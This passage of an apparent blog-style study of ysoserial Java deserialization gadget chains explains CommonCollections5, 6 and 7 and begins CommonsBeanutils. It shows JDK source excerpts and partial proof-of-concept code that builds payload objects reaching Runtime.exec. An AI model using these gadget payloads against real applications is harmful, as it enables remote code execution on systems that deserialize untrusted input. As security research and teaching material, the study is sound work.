class="hljs-string">&quot;foo&quot;</span> &#125;;  <br><span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(  <br>      paramTypes, args);  <br>  <br><span class="hljs-comment">// grab defensively copied arrays  </span><br>paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="hljs-string">&quot;iParamTypes&quot;</span>);  <br>args = (Object[]) Reflections.getFieldValue(instantiate, <span class="hljs-string">&quot;iArgs&quot;</span>);  <br>  <br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123; constant, instantiate &#125;);  <br>  <br><span class="hljs-comment">// create queue with numbers  </span><br>PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chain));  <br>queue.add(<span class="hljs-number">1</span>);  <br>queue.add(<span class="hljs-number">1</span>);  <br>  <br><span class="hljs-comment">// swap in values to arm  </span><br>Reflections.setFieldValue(constant, <span class="hljs-string">&quot;iConstant&quot;</span>, TrAXFilter.class);  <br>paramTypes[<span class="hljs-number">0</span>] = Templates.class;  <br>args[<span class="hljs-number">0</span>] = templates;  <br>  <br><span class="hljs-keyword">return</span> queue;<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="CommonCollections5"><a href="#CommonCollections5" class="headerlink" title="CommonCollections5"></a>CommonCollections5</h3><blockquote>
+<p>[!NOTE] pre-requirements<br>JDK &gt;&#x3D; 1.8, reproduce with JDK1.8_0382<br>commons-collections:commons-collections:3.1</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Gadgets chain:</span><br>transform:<span class="hljs-number">121</span>, ChainedTransformer (org.apache.commons.collections.functors)<br>get:<span class="hljs-number">151</span>, LazyMap (org.apache.commons.collections.map)<br>getValue:<span class="hljs-number">73</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)<br>toString:<span class="hljs-number">131</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)<br>readObject:<span class="hljs-number">86</span>, BadAttributeValueExpException (javax.management)<br>readObject:<span class="hljs-number">461</span>, ObjectInputStream (java.io)<br></code></pre></td></tr></table></figure>
+
+<p>In JDK1.8, there is new restriction on <code>AnnotationInvocationHandler</code>([[Java Deserialize Vulnerabilities ysoserial study#JDK fixes|here]]), but updates to the <code>BadAttributeValueExpException</code> class can be exploited to fill the vacancy.<br><code>TiedMapEntry</code> can bind key to a specific map, any operation on this entry will be delegated to that map.</p>
+<p>Firstly, look into <code>BadAttributeValueExpException</code>‘s <code>readObject</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <br>    ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();  <br>    <span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-literal">null</span>);  <br>  <br>    <span class="hljs-keyword">if</span> (valObj == <span class="hljs-literal">null</span>) &#123;  <br>        val = <span class="hljs-literal">null</span>;  <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;  <br>        val= valObj;  <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span>  <br>            || valObj <span class="hljs-keyword">instanceof</span> Long  <br>            || valObj <span class="hljs-keyword">instanceof</span> Integer  <br>            || valObj <span class="hljs-keyword">instanceof</span> Float  <br>            || valObj <span class="hljs-keyword">instanceof</span> Double  <br>            || valObj <span class="hljs-keyword">instanceof</span> Byte  <br>            || valObj <span class="hljs-keyword">instanceof</span> Short  <br>            || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;  <br>        val = valObj.toString();  <br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix  </span><br>        val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Its <code>val</code> member could be any type assigned by constructor. Here we can see a constraint that <code>System.getSecurityManager()</code> should be null. Note that, in former JDK version(&lt;1.8), <code>BadAttributeValueExpException</code> have not override <code>readObject</code> so it’s not vulnerable.</p>
+<p>Step into <code>TiedMapEntry</code>‘s <code>toString()</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">return</span> getKey() + <span class="hljs-string">&quot;=&quot;</span> + getValue();  <br>&#125;<br><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">return</span> map.get(key);  <br>&#125;<br></code></pre></td></tr></table></figure>
+<p><code>toString()</code> will call <code>getValue()</code> and call <code>map.get()</code>, satisfying <code>LazyMap</code>‘s constraint.</p>
+<p>So here comes the Poc(partial):</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br><span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);  <br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;foo&quot;</span>);  <br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);  <br><span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);  <br>      Reflections.setAccessible(valfield);  <br>valfield.set(val, entry);<br>...<br></code></pre></td></tr></table></figure>
+
+<p>End.</p>
+<h3 id="CommonCollections6-jdk1-8-1-7"><a href="#CommonCollections6-jdk1-8-1-7" class="headerlink" title="CommonCollections6 jdk1.8 1.7"></a>CommonCollections6 jdk1.8 1.7</h3><blockquote>
+<p>[!NOTE] pre-requirements<br>JDK1.7 or 1.8, reproduce successful on both<br>commons-collections:commons-collections:3.1</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain:</span><br>	java.io.ObjectInputStream.readObject()<br>		java.util.HashSet.readObject()<br>			java.util.HashMap.put()<br>			java.util.HashMap.hash()<br>				org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()<br>				org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()<br>					org.apache.commons.collections.map.LazyMap.get()<br>						org.apache.commons.collections.functors.ChainedTransformer.transform()<br>						org.apache.commons.collections.functors.InvokerTransformer.transform()<br>						java.lang.reflect.Method.invoke()<br>							java.lang.Runtime.exec()<br></code></pre></td></tr></table></figure>
+
+<p>In general, <code>TiedMapEntry</code>‘s <code>hashCode()</code> method would call <code>map.get(key)</code> and make a flaw for <code>LazyMap</code>. <code>HashMap</code>‘s <code>readObject()</code> calls <code>hashCode()</code> of key to calculate hash, which makes sense for the exploitation above.</p>
+<p>Firstly, see <code>HashMap</code>‘s <code>readObject()</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <br>  ...<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;  <br>	    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <br>	        <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();  <br>	    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <br>	        <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();  <br>	    putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);  <br>	&#125;<br>	...<br>    <br></code></pre></td></tr></table></figure>
+
+<p>Step into <code>hash()</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;  <br>    <span class="hljs-type">int</span> h;  <br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);  <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>If key is a <code>TiedMapEntry</code>, then the common exploitation chain takes effect.</p>
+<p>So the next step is to put a <code>TiedMapEntry</code> into hash map.<br>To avoid contaminating <code>LazyMap</code> during payload creation, <strong>we should not just call  <code>map.put</code> to insert node</strong>. In order to avoid calling <code>hash(entry)</code>, there are two alternative ways: by <code>putVal()</code> or directly inserting node into underlying hash table(later is what ysoserial does). Let’s reproduce the former way(<code>putVal</code>). </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);  <br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;padishah&quot;</span>);  <br>  <br><span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();  <br><span class="hljs-type">Method</span> <span class="hljs-variable">putMethod</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br><span class="hljs-type">int</span> <span class="hljs-variable">JDK_VERSION</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;  <br><span class="hljs-keyword">try</span> &#123;  <br>    putMethod = HashMap.class.getDeclaredMethod(<span class="hljs-string">&quot;putVal&quot;</span>, <span class="hljs-type">int</span>.class, Object.class, Object.class, <span class="hljs-type">boolean</span>.class, <span class="hljs-type">boolean</span>.class);  <br>    JDK_VERSION = <span class="hljs-number">8</span>;  <br>&#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;  <br>    putMethod = HashMap.class.getDeclaredMethod(<span class="hljs-string">&quot;addEntry&quot;</span>, <span class="hljs-type">int</span>.class, Object.class, Object.class, <span class="hljs-type">int</span>.class);  <br>    JDK_VERSION = <span class="hljs-number">7</span>;  <br>&#125;  <br>putMethod.setAccessible(<span class="hljs-literal">true</span>);  <br><span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> transformerChain.hashCode();<span class="hljs-comment">// a random hashcode  </span><br><span class="hljs-keyword">if</span> (JDK_VERSION == <span class="hljs-number">8</span>) &#123;  <br>    putMethod.invoke(map, hash, entry, <span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);  <br>&#125; <span class="hljs-keyword">else</span> &#123;  <br>    putMethod.invoke(map, hash, entry, <span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-number">0</span>);  <br>&#125;  <br>Reflections.setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);  <br><span class="hljs-keyword">return</span> map;<br></code></pre></td></tr></table></figure>
+<p>^CC6-1<br>Note that, <code>HashMap</code> for JDK1.7 adds node in a different way from that of JDK1.8. JDK1.7 use <code>addEntry</code> in replacement of <code>putVal</code>.</p>
+<h3 id="CommonCollections7-jdk1-8-1-7"><a href="#CommonCollections7-jdk1-8-1-7" class="headerlink" title="CommonCollections7 jdk1.8 1.7"></a>CommonCollections7 jdk1.8 1.7</h3><blockquote>
+<p>[!NOTE] pre-requirements<br>JDK1.7 or 1.8, only reproduced on JDK1.8<br>commons-collections:commons-collections:3.1</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain:</span><br>java.util.Hashtable.readObject  <br>java.util.Hashtable.reconstitutionPut  <br>org.apache.commons.collections.map.AbstractMapDecorator.equals  <br>java.util.AbstractMap.equals  <br>org.apache.commons.collections.map.LazyMap.get  <br>org.apache.commons.collections.functors.ChainedTransformer.transform  <br>org.apache.commons.collections.functors.InvokerTransformer.transform  <br>java.lang.reflect.Method.invoke  <br>sun.reflect.DelegatingMethodAccessorImpl.invoke  <br>sun.reflect.NativeMethodAccessorImpl.invoke  <br>sun.reflect.NativeMethodAccessorImpl.invoke0  <br>java.lang.Runtime.exec<br></code></pre></td></tr></table></figure>
+
+<h4 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h4><p>This vulnerability exists in <code>Hashtable</code>‘s hash collision check progress which is part of <code>readObject()</code>. It will compare hash between the node to be inserted and each existing node. If their hash appears to be the same, then compare further using <code>equals()</code>. Both <code>hashCode()</code> and <code>equals()</code> are delegated to the node itself.<br><code>AbstractMap</code>(which is the super class of <code>HashMap</code>)’s <code>equals()</code> will call <code>that.get()</code>, that satisfies <code>LazyMap</code>‘s trigger condition.<br>It’s quite easy to spoof two <code>LazyMap</code> nodes that have the same hash but different keys. This is how this vul occurs.</p>
+<h4 id="Exploit-chain"><a href="#Exploit-chain" class="headerlink" title="Exploit chain"></a>Exploit chain</h4><p>Firstly, see <code>Hashtable</code>‘s <code>readObject()</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span>  <br>     <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException  <br>&#123;<br>	<span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;  <br>	    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <br>	        <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K)s.readObject();  <br>	    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <br>	        <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V)s.readObject();  <br>	    <span class="hljs-comment">// sync is eliminated for performance  </span><br>	    reconstitutionPut(table, key, value);  <br>	&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>Step into <code>reconstitutionPut()</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span>  <br>    <span class="hljs-keyword">throws</span> StreamCorruptedException  <br>&#123;<br>	...<br>	<span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();  <br>	<span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;  <br>	<span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;  <br>	    <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;  <br>	        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();  <br>	    &#125;  <br>	&#125;<br>	...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>We should satisfy <code>e.hash==hash</code> to reach <code>equals(key)</code>. When using <code>LazyMap</code> to decorate <code>HashMap</code>, <code>equals()</code> will delegate to <code>AbstractMap</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>	...<br>	Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;<br>	...<br>	Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();  <br>	<span class="hljs-keyword">while</span> (i.hasNext()) &#123;  <br>	    Entry&lt;K,V&gt; e = i.next();  <br>	    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> e.getKey();  <br>	    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> e.getValue();  <br>	    <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;  <br>	        <span class="hljs-keyword">if</span> (!(m.get(key)==<span class="hljs-literal">null</span> &amp;&amp; m.containsKey(key)))  <br>	            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>	    &#125; <span class="hljs-keyword">else</span> &#123;  <br>	        <span class="hljs-keyword">if</span> (!value.equals(m.get(key)))  <br>	            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>	    &#125;  <br>	&#125;<br>	...<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>^CC7-01</p>
+<p>If the input object <code>o</code> is a <code>LazyMap</code>, <code>m.get(key)</code> will trigger its transformers. By the way, even if a <code>LazyMap</code> does not have the key of another map, it’s still equivalent to that map(which can be any map), since it’s able to create the missing key and <code>get()</code> will always return a value. ^1b8389</p>
+<h4 id="Hash-collision"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</h4><p>After understanding the routine, let’s construct the two <code>LazyMap</code>. First, look at the <code>hashCode()</code> of <code>LazyMap</code>, which delegates to <code>AbstractMapDecorator</code>, then delegates to the underlying map(here is <code>HashMap</code>), finally find it in its super class <code>AbstractMap</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();  <br>    <span class="hljs-keyword">while</span> (i.hasNext())  <br>        h += i.next().hashCode();  <br>    <span class="hljs-keyword">return</span> h;  <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Consider a <code>LazyMap</code> with single entry: <code>&quot;aa&quot;: 1</code>, its hash code should equals to <code>&quot;aa&quot;.hashCode()</code>. Step into <code>String#hashCode</code>, its document says:</p>
+<blockquote>
+<p>Returns a hash code for this string. The hash code for a String object is computed as:<br>s[0]*31^(n-1) + s[1]*31^(n-2) + … + s[n-1]</p>
+<p>using int arithmetic, where s[i] is the ith character of the string, n is the length of the string, and ^ indicates exponentiation. (The hash value of the empty string is zero.)</p>
+</blockquote>
+<p><code>&quot;ab&quot;.hashCode()</code> is calculated as <code>&#39;a&#39;*31 + &#39;b&#39;</code>. It’s easy to find a collision. Abstract the hash code of two-character string to <code>x*31 + y</code>, which is equals to <code>(x+1)*31 + (y-31)</code>, so one of the equivalences of <code>&quot;ab&quot;</code> is <code>&quot;bC&quot;</code> .</p>
+<h4 id="Write-payload"><a href="#Write-payload" class="headerlink" title="Write payload"></a>Write payload</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();  <br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();  <br><span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer1);  <br><span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer1);  <br>lazyMap1.put(<span class="hljs-string">&quot;ab&quot;</span>, <span class="hljs-number">1</span>);  <br>lazyMap2.put(<span class="hljs-string">&quot;bC&quot;</span>, <span class="hljs-number">1</span>);  <br>  <br><span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();  <br>hashtable.put(lazyMap1, <span class="hljs-number">1</span>);  <br>hashtable.put(lazyMap2, <span class="hljs-number">1</span>);  <br>  <br>Reflections.setFieldValue(chainedTransformer1, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);  <br>  <br>lazyMap2.remove(<span class="hljs-string">&quot;ab&quot;</span>);<br><br><span class="hljs-keyword">return</span> hashtable;<br></code></pre></td></tr></table></figure>
+
+<p>Note that, while put <code>lazyMap2</code> into hash table, we can see in [[Java Deserialize Vulnerabilities ysoserial study#^CC7-01|this code block]] that <code>lazyMap2.get(&quot;ab&quot;)</code> would be called in <code>equals()</code>, so we should remove this redundant entry. To ensure <code>lazyMap2.get(&quot;ab&quot;)</code> is not equal to that of <code>lazyMap1</code>, we decorate <code>lazyMap2</code> with a transformer that will not return <code>1</code>(an empty chain, will get <code>ab: ab</code>).</p>
+<p>End.</p>
+<hr>
+<h2 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h2><blockquote>
+<p>[!NOTE] pre-requirements<br>JDK1.8<br>commons-beanutils:commons-beanutils:1.9.2<br>commons-collections:commons-collections:3.1<br>commons-logging:commons-logging:1.2</p>
+</blockquote>
+<h3 id="Using-TemplatesImpl-CB1-CB2"><a href="#Using-TemplatesImpl-CB1-CB2" class="headerlink" title="Using TemplatesImpl (CB1 CB2)"></a>Using TemplatesImpl (CB1 CB2)</h3><p><code>TemplatesImpl</code> has an property named <code>_outputProperties</code> whose getter is <code>getOutputProperties()</code> according to java bean naming principle. </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title function_">getOutputProperties</span><span class="hljs-params">()</span> &#123;   <br>	<span class="hljs-keyword">try</span> &#123;  <br>	    <span class="hljs-keyword">return</span> newTransformer().getOutputProperties();  <br>	&#125;  <br>	<span class="hljs-keyword">catch</span> (TransformerConfigurationException e) &#123;  <br>	    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>	&#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>In this method, the method <code>newTransformer()</code> is called, which serves as an entry to executing arbitrary code([[Java Deserialize Vulnerabilities ysoserial study#TemplatesImpl exploit|here]]).<br>The class <code>BeanComparator</code> in <code>commons-beanutils</code> project is disclosed for triggering this flaw in the deserialization procession.<br>In its <code>compare()</code> method:</p>
